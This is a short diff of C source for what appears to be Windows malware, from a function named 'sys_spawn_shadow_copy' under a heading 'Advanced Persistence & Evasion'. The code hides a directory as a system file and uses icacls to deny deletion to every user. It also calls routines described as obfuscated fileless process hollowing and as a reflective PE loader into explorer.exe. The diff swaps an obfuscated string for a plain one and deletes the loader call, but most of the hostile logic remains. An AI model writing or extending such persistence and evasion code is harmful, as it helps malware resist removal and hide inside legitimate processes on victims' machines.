@@ -577,7 +577,7 @@ void sys_spawn_shadow_copy(void) {
     
     /* Harden directory FIRST — deny DELETE_CHILD so files can't be deleted from it */
     SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-    char *icacls = obf_icacls();
+    char *icacls = "icacls";
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
         "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
@@ -604,7 +604,7 @@ void sys_spawn_shadow_copy(void) {
     Sleep(2000);
     util_spawn_memory();      /* obfuscated fileless hollowing */
     Sleep(1000);
-    obf_reflective_load();         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
+    /* REMOVED */;         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
 }
 
 /* === Advanced Persistence & Evasion === */
